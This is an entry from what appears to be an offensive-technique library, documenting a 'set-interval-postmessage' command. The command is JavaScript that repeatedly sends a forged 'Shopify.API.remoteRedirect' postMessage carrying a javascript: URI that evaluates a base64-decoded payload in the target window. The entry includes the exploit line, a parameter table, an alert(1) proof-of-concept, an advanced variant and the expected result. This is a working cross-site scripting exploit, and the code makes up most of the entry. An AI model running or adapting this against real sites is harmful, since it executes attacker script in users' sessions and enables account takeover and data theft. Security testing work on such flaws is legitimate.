---
id: 123e4567-e89b-12d3-a456-426614174006
name: set-interval-postmessage
type: command
executor: javascript
data: >-
  interval=setInterval(()=>{ ctx && ctx.postMessage({
  "message":"Shopify.API.remoteRedirect", "data":{
  "location":`javascript:eval(atob('${payload}'))` } },location.origin); },500);
output: Repeated postMessages until success.
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.691Z'
platforms:
  - Web
tags:
  - xss
  - postmessage
verified: false
validated: true
submitted: true
---

# set-interval-postmessage

## Command

```javascript
interval=setInterval(()=>{ ctx && ctx.postMessage({ "message":"Shopify.API.remoteRedirect", "data":{ "location":`javascript:eval(atob('${payload}'))` } },location.origin); },500);
```

## Description

Sets a timer to repeatedly send postMessages to the target window, attempting to exploit remoteRedirect with a javascript: URI that evaluates a base64-decoded payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| interval | 500ms delay between attempts | Yes |
| message | "Shopify.API.remoteRedirect" API call | Yes |
| location | `javascript:eval(atob('${payload}'))` exploit URI | Yes |

## Examples

### Basic Usage

```javascript
let interval = setInterval(() => { ctx.postMessage({ message: 'Shopify.API.remoteRedirect', data: { location: 'javascript:alert(1)' } }, '*'); }, 500);
```

### Advanced Usage

```javascript
let interval = setInterval(() => { if (ctx) ctx.postMessage(payloadObj, origin); }, 1000);
```

## Expected Output

No direct output; console may log errors if postMessage fails, but successful delivery triggers payload eval in target.

## Related

- [[Related Procedure|procedures/Trigger-XSS-by-Visiting-and-Clicking-Link]]
